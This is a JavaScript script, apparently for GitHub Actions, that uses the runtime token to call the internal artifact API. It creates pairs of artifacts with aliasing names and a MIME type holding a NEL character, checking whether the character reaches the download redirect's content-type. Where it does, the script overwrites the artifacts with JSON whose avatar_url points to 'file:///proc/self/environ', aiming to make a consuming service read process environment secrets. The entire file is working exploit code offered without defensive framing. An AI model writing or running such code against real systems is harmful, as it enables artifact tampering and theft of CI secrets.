module.exports = async function scan({context}) {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString());
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, run, job] = scope.split(':');
  const ids = {workflow_run_backend_id: run, workflow_job_run_backend_id: job};
  const endpoint = `${new URL(process.env.ACTIONS_RESULTS_URL).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
  const oddMime = '\u0085application/json';
  const cases = [
    ['case', 'mixed', 'MIXED'],
    ['trailing-dot', 'dot', 'dot.'],
    ['trailing-space', 'space', 'space '],
    ['unicode-nfc', 'caf\u00e9', 'cafe\u0301'],
    ['nel-suffix', 'nel', 'nel\u0085'],
    ['encoded-dot', 'encoded.', 'encoded%2e'],
  ];
  async function twirp(method, payload) {
    const r = await fetch(endpoint + method, {
      method: 'POST',
      headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify(payload),
    });
    return {status: r.status, data: await r.json().catch(() => ({}))};
  }
  async function upload(url, bytes) {
    const r = await fetch(url, {
      method: 'PUT',
      headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': oddMime, 'Content-Length': String(bytes.length)},
      body: bytes,
    });
    return r.status;
  }
  const repo = `${context.repo.owner}/${context.repo.repo}`;
  const seen = new Set();
  for (const [label, left, right] of cases) {
    const nameA = `alias-${context.runId}-${left}`;
    const nameB = `alias-${context.runId}-${right}`;
    try {
      const created = await Promise.all([
        twirp('CreateArtifact', {...ids, name: nameA, version: 6, mime_type: oddMime}),
        twirp('CreateArtifact', {...ids, name: nameB, version: 7, mime_type: 'application/json'}),
      ]);
      const urls = created.map(x => x.data.signed_upload_url || x.data.signedUploadUrl);
      if (created.some(x => x.status !== 200 || !x.data.ok) || urls.some(x => !x)) {
        console.log('CASE', JSON.stringify({label, names:[nameA,nameB], create:created.map(x => [x.status,x.data.msg || ''])}));
        continue;
      }
      const bytes = Buffer.from('{"probe":"placeholder"}');
      const put = await Promise.all(urls.map(u => upload(u,bytes)));
      const finalized = await Promise.all([
        twirp('FinalizeArtifact', {...ids,name:nameA,size:String(bytes.length)}),
        twirp('FinalizeArtifact', {...ids,name:nameB,size:String(bytes.length)}),
      ]);
      const results = [];
      for (const x of finalized) {
        const id = String(x.data.artifact_id || x.data.artifactId || '');
        if (!/^[0-9]+$/.test(id) || seen.has(id)) {results.push({id,final:x.status,duplicate:true});continue;}
        seen.add(id);
        const req = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`, {
          redirect:'manual',headers:{Authorization:`Bearer ${process.env.GH_TOKEN}`,Accept:'application/vnd.github.v3+json'},
        });
        const location=req.headers.get('location');
        const rsct=location ? new URL(location).searchParams.get('rsct') : null;
        results.push({id,final:x.status,rest:req.status,rsct});
        if (rsct?.includes('\u0085')) {
          const body = Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'Repo Cassette alias probe',stargazers_count:0}));
          await Promise.all(urls.map(u => upload(u,body)));
          console.log('POTENTIAL_WINNER',JSON.stringify({label,id,repository:`${repo}/actions/artifacts/${id}/zip`,rsct}));
        }
      }
      console.log('CASE',JSON.stringify({label,names:[nameA,nameB],create:created.map(x=>x.status),put,results}));
    } catch (error) {
      console.log('CASE',JSON.stringify({label,error:String(error).slice(0,240)}));
    }
  }
};
